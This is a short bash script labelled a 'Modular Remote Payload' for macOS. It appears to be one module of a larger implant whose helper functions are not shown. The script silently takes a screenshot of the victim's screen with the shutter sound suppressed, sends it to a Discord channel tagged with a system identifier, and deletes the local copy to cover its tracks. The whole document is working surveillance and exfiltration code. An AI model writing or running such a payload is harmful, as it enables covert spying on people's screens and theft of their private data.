#!/bin/bash
# ============================================================
# Screenshot Capture for macOS - Modular Remote Payload
# ============================================================
# Takes a screenshot and sends to Discord
# ============================================================

SYSID=$(get_sysid)
SCREENSHOT="/tmp/screenshot_$(date +%s).png"

# macOS has screencapture built-in
if screencapture -x "$SCREENSHOT" 2>/dev/null && [[ -f "$SCREENSHOT" ]]; then
    send_discord "📸 Screenshot from **$SYSID**" "$SCREENSHOT"
    rm -f "$SCREENSHOT"
else
    send_discord "❌ Screenshot failed on $SYSID"
fi

